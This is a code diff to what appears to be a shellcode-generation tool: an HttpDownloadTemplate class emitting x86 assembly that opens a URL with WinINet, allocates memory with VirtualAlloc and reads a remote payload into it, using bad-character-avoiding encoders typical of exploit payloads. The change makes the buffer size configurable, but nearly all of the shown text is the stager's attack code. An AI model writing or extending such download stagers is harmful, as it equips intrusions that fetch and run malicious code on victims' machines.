@@ -31,13 +31,14 @@ from ..encode import (
 )
 
 
-_ALLOC_SIZE = 0x100000
+_DEFAULT_ALLOC = 0x100000
 
 
 class HttpDownloadTemplate(PayloadTemplate):
 
     def emit(self, layout, config: TemplateConfig) -> str:
         bc = config.badchars
+        alloc_size = config.alloc_size or _DEFAULT_ALLOC
 
         inet_open_off   = -layout.slot("InternetOpenA").offset
         inet_url_fn_off = -layout.slot("InternetOpenUrlA").offset
@@ -89,13 +90,13 @@ class HttpDownloadTemplate(PayloadTemplate):
             *safe_call_mem("ebp", inet_url_fn_off, bc),
             *safe_mem_store("ebp", inet_url_h_off, "eax", bc),
             "",
-            f"    ; VirtualAlloc(NULL, 0x{_ALLOC_SIZE:x}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)",
+            f"    ; VirtualAlloc(NULL, 0x{alloc_size:x}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)",
             "    xor  eax, eax",
             *safe_push_imm(4, bc),
             "    ; PAGE_READWRITE",
             *safe_push_dword(0x3000, bc),
             "    ; MEM_COMMIT|MEM_RESERVE",
-            *safe_push_dword(_ALLOC_SIZE, bc),
+            *safe_push_dword(alloc_size, bc),
             "    ; dwSize",
             "    xor  eax, eax",
             "    push eax                    ; lpAddress = NULL",
@@ -107,8 +108,8 @@ class HttpDownloadTemplate(PayloadTemplate):
             *safe_mem_store("ebp", bytes_total_off, "eax", bc),
             "",
             "http_read_loop:",
-            f"    ; remaining = 0x{_ALLOC_SIZE:x} - bytes_total",
-            *encode_dword(_ALLOC_SIZE, bc, "ecx"),
+            f"    ; remaining = 0x{alloc_size:x} - bytes_total",
+            *encode_dword(alloc_size, bc, "ecx"),
             *safe_sub_from_mem("ecx", "ebp", bytes_total_off, bc),
             "    test ecx, ecx",
             "    jle  http_read_done          ; buffer full",
